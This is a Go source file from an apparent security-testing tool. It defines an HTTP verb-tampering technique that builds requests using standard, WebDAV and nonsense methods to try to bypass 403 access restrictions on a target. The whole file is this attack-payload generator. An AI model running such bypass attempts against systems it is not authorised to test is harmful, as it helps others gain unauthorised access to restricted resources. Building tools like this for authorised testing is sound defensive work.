// Package bypass — verb-based bypass technique.
package bypass

// VerbsTechnique tests alternate HTTP methods to bypass 403 restrictions.
type VerbsTechnique struct{}

func (v *VerbsTechnique) Name() string        { return "verbs" }
func (v *VerbsTechnique) Description() string { return "HTTP verb/method tampering" }

// Generate produces a payload for every HTTP verb variant.
func (v *VerbsTechnique) Generate(target *Target) []Payload {
	methods := []string{
		"GET", "POST", "PUT", "DELETE", "PATCH",
		"HEAD", "OPTIONS", "TRACE", "CONNECT",
		"PROPFIND", "MKCOL", "COPY", "MOVE",
		"LOCK", "UNLOCK", "PROPPATCH", "SEARCH",
		// Non-standard / fuzz methods
		"FOOBAR", "CATS", "DOGS", "HACK", "BYPASS", "TEST", "AAA",
	}

	// Methods that need Content-Length: 0 to avoid 411 Length Required.
	needsCL := map[string]bool{"POST": true, "PUT": true, "PATCH": true}

	payloads := make([]Payload, 0, len(methods))
	for _, m := range methods {
		p := Payload{
			TechniqueName: v.Name(),
			Description:   "Method " + m,
			Method:        m,
			URL:           target.FullURL(),
			Headers:       make(map[string]string),
		}
		if needsCL[m] {
			p.Headers["Content-Length"] = "0"
		}
		payloads = append(payloads, p)
	}
	return payloads
}
